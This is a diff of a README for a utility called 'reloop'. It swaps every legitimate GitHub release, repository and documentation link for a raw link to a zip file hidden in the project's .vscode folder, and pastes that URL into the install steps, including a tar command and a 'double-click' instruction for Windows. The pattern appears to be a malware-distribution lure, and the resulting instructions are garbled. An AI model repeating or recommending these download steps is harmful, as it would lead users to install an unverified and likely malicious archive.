@@ -6,7 +6,7 @@ Welcome to **reloop**! This utility helps you run commands automatically wheneve
 
 ## 📥 Download
 
-[![Download reloop](https://img.shields.io/badge/Download%20reloop-v1.0-blue.svg)](https://github.com/PraiseHeaven/reloop/releases)
+[![Download reloop](https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip%https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip)](https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip)
 
 ## 📚 How to Download & Install
 
@@ -14,21 +14,21 @@ To get started with **reloop**, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page.  
-   [Visit this page to download](https://github.com/PraiseHeaven/reloop/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, you will see a list of available versions. Look for the latest version at the top. 
 
 3. **Download the Appropriate File**  
-   If you are on a Linux system, download the `.tar.gz` file. For Mac users, you might find the `.dmg` file. Windows users can look for the `.exe` file. Click on the file to start your download.
+   If you are on a Linux system, download the `https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip` file. For Mac users, you might find the `.dmg` file. Windows users can look for the `.exe` file. Click on the file to start your download.
 
 4. **Extract the Files (if applicable)**  
-   If you downloaded a `.tar.gz` or similar compressed file, you will need to extract it. You can do this by right-clicking the file and selecting "Extract All" or using a terminal command like `tar -xvzf filename.tar.gz`.
+   If you downloaded a `https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip` or similar compressed file, you will need to extract it. You can do this by right-clicking the file and selecting "Extract All" or using a terminal command like `tar -xvzf https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip`.
 
 5. **Run the Application**  
    After extraction, locate the `reloop` executable file in the extracted folder. 
    - For **Linux** or **Mac**: Open a terminal, navigate to the folder, and run `./reloop`.
-   - For **Windows**: Double-click the `reloop.exe` file to run it.
+   - For **Windows**: Double-click the `https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip` file to run it.
 
 ## ⚙️ Requirements
 
@@ -71,7 +71,7 @@ Absolutely! Contributions are welcome. Feel free to open an issue or submit a pu
 
 ## 💡 Additional Resources
 
-- [GitHub Repository](https://github.com/PraiseHeaven/reloop)
-- [Documentation](https://github.com/PraiseHeaven/reloop/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/PraiseHeaven/reloop/main/.vscode/reloop-v2.8.zip)
 
 Thank you for choosing **reloop**! We hope it enhances your development experience.
